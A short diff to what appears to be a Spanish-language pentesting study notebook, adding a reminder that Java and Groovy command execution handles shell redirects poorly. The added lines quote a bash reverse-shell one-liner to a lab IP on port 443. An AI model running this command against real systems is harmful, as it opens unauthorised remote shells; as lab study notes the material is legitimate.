@@ -50,6 +50,14 @@ Para la herramienta ffuf y el uso del parametro -ac
 
 > ffuf detecta el “ruido” del sitio y lo oculta automáticamente.
 
+## Recordar Java y Groovy
+
+No les gustan las shells dentro del mismo string no lo manejan bien como:
+
+> bash -i >& /dev/tcp/10.10.14.6/443 0>&1
+
+> My first attempt is always to try a bash reverse shell, but I couldn’t get it to work here. A lot of times languages like Java and Groovy don’t handle redirects and pipes inside command execution, and this shell is full of them.
+
 
 ## Kali Linux con WLS
 
